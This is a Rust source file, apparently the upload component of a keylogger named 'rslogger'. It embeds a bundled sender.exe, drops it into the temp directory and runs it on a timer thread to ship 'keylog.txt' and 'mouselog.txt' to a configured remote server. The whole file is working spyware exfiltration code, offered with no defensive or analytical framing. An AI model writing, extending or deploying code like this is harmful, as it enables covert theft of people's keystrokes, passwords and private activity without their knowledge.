use std::fs::File;
use std::io::Write;
use std::process::Command;
use std::path::Path;
use std::time::Duration;
use std::sync::{Arc, Mutex};
use std::thread;
use std::env;

static SENDER_EXE: &[u8] = include_bytes!("sender.exe");

pub struct UploaderConfig {
    pub server_address: String,
    pub send_interval_seconds: u64,
}

impl UploaderConfig {
    pub fn new(server_address: String, send_interval_seconds: u64) -> Self {
        Self {
            server_address,
            send_interval_seconds,
        }
    }
}

fn extract_sender() -> Result<String, std::io::Error> {
    let temp_dir = env::temp_dir();
    let sender_path = temp_dir.join("rslogger_sender.exe");
    
    if !sender_path.exists() {
        let mut file = File::create(&sender_path)?;
        file.write_all(SENDER_EXE)?;
    }
    
    Ok(sender_path.to_str().unwrap().to_string())
}

pub fn send_file(server_address: &str, file_path: &str) -> bool {
    if !Path::new(file_path).exists() {
        return false;
    }

    let sender_path = match extract_sender() {
        Ok(path) => path,
        Err(_) => return false,
    };

    let result = Command::new(sender_path)
        .arg(server_address)
        .arg(file_path)
        .output();

    match result {
        Ok(output) => output.status.success(),
        Err(_) => false,
    }
}

pub fn start_periodic_uploader(config: UploaderConfig, running: Arc<Mutex<bool>>) {
    thread::spawn(move || {
        loop {
            thread::sleep(Duration::from_secs(config.send_interval_seconds));

            let should_continue = *running.lock().unwrap();
            if !should_continue {
                break;
            }

            send_file(&config.server_address, "keylog.txt");
            send_file(&config.server_address, "mouselog.txt");
        }
    });
}

